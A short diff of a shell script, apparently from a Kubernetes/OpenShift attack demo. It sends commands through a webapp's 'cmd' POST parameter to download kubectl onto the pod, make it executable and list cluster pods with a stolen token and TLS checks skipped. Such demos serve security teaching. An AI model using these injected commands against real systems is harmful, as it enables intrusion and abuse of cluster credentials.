@@ -61,5 +61,5 @@ curl -X POST -d "cmd=curl -L -o /tmp/kubectl https://dl.k8s.io/release/v1.27.2/b
 # chmod +x kubectl
 curl -X POST -d "cmd=chmod +x /tmp/kubectl" "http://$(oc -n frontend get route/webapp --output jsonpath={.spec.host})"/posts
 
-
-command='curl -L -o /tmp/kubectl https://dl.k8s.io/release/v1.27.2/bin/linux/amd64/kubectl && chmod +x /tmp/kubectl && /tmp/kubectl get pods'
+# list all pods 
+curl -X POST -d "cmd=/tmp/kubectl --insecure-skip-tls-verify=true --token /tmp/token" "http://$(oc -n frontend get route/webapp --output jsonpath={.spec.host})"/posts
